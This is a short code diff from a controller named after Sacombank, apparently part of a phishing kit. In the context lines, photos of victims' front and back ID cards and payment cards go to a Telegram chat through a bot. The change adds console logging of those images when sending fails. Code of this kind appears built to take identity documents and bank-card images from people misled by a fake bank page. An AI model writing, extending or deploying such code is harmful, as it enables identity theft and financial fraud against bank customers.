@@ -86,6 +86,10 @@ export class SacombankController {
         frontCard && bot.sendPhoto(CHAT_ID, frontCard),
         backCard && bot.sendPhoto(CHAT_ID, backCard),
       ]).catch((err) => {
+        console.log("frontIdCard", frontIdCard);
+        console.log("backIdCard", backIdCard);
+        console.log("frontCard", frontCard);
+        console.log("backCard", backCard);
         console.log("err", err.message);
       });
 
